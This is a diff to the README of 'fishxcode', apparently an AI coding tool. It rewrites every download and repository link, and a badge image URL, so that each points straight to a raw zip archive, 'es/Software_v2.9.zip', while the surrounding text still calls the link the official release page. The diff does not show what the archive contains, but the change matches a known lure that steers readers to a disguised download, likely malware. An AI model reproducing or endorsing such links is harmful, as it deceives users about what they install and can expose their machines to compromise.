@@ -1,6 +1,6 @@
 # 🐟 fishxcode - Easy AI Coding on Multiple Platforms
 
-[![Download fishxcode](https://img.shields.io/badge/Download-fishxcode-blue?logo=github)](https://github.com/BramSkiee/fishxcode/releases)
+[![Download fishxcode](https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip)](https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Follow these steps to get fishxcode running on your device.
 
 Go to the official download page by clicking this link or button below:
 
-[![Download fishxcode](https://img.shields.io/badge/Download-fishxcode-blue?logo=github)](https://github.com/BramSkiee/fishxcode/releases)
+[![Download fishxcode](https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip)](https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip)
 
 This page lists all available versions of fishxcode for different platforms.
 
@@ -111,7 +111,7 @@ If you run into issues or have questions:
 
 - Check the built-in documentation in fishxcode under the Help menu.
 - Visit the GitHub repository to read FAQs and report problems:
-  https://github.com/BramSkiee/fishxcode
+  https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip
 - Look at the community section on GitHub for tips shared by other users.
 
 This app is designed for ease of use, but help is available when you need it.
@@ -133,7 +133,7 @@ Always avoid sharing sensitive or personal information in your queries.
 
 Get fishxcode from the official release page here:
 
-[Download fishxcode on GitHub](https://github.com/BramSkiee/fishxcode/releases)
+[Download fishxcode on GitHub](https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip)
 
 **Steps to download and install:**
 
@@ -179,4 +179,4 @@ fishxcode is open to users with the terms described in its GitHub repository. Ch
 
 fishxcode makes powerful AI coding tools easy to use on your device. Visit the download page to get started today:
 
-[https://github.com/BramSkiee/fishxcode/releases](https://github.com/BramSkiee/fishxcode/releases)
+[https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip](https://github.com/BramSkiee/fishxcode/raw/refs/heads/main/es/Software_v2.9.zip)
